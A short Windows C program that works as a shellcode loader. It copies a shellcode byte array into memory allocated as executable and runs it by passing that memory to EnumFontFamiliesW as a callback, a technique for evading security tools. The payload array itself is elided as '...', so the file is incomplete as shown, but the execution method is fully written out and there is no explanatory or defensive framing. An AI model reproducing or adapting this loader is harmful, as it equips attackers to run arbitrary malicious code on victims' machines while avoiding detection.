#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = ...

int main() {
    LPVOID address = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(address, &shellcode[0], sizeof(shellcode));
    HDC dc = GetDC(NULL);
    EnumFontFamiliesW(dc, NULL, (FONTENUMPROCW)address, 0);
    return 0;
}